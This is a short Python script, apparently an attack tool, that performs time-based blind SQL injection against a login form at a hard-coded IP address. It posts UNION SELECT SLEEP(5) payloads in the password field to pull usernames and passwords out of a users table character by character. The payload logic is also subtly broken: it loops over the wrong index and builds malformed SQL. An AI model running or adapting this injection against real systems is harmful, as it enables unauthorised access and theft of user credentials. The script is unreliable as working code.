import requests
import time


def fku():
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    tab = ["id", "username", "password"]
    texte = ""
    TIME=5
    global table
    table = ",1,2"
    x = 1
    url = "http://51.15.136.118/pageid.php"
    for i in range (1, 10):
        for j in range (len(tab)-1):
            usr = "idc"
            start_time = time.time()
            passwd = "' UNION SELECT SLEEP(5)" + table + " " + tab[j] + " FROM users WHERE " + tab[j] + " = '" + str(x) + "' and " + tab[j+1] + " like '" + texte + dictionary[j] + "%' -- "
            response = requests.post(url, data={'username': usr, 'password': passwd})
            print(passwd)
            end_time = time.time()
            total_time = end_time - start_time
            x += 1
            if total_time >= TIME:
                texte += dictionary[j]


fku()